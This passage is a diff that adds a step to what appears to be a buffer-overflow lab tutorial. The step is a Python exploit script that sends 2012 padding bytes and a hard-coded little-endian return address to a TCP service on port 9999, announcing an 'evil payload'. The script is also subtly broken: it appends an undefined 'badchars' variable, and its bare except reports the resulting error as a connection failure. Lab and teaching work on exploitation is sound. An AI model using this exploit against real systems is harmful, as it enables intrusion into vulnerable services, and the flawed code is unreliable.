@@ -664,6 +664,38 @@ except:
             
                 - So, we will save our new script:
 
+```python  
+#!/usr/bin/python
+
+import socket
+import sys
+
+        # Remember x86 Architecture:
+
+    # Original = `625014DF`
+    # Spaced   = `62 50 14 DF`
+    # Reversed = `DF 14 50 62`
+    # Final    = "\xDF\x14\x50\x62"
+    
+username = b"fz3r0"
+message = b"A" * 2012 + b"\xDF\x14\x50\x62"
+
+try:        
+        print("X:\>Fz3r0.buffer_overflow> Sending evil payload...")    
+        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+        s.connect(('192.168.1.100',9999))      
+        s.recv(1024)
+        s.recv(1024)
+        s.send(username + b'\r\n')
+        s.recv(1024)
+        s.send(message + badchars + b'\r\n')    
+        s.recv(1024)
+        s.close()
+        
+except:
+        print("X:\>Fz3r0.buffer_overflow> Error connecting to server!!! Do'nt ask me, I'm just a script!!! >.<")
+        sys.exit()
+```
 
 
 ---
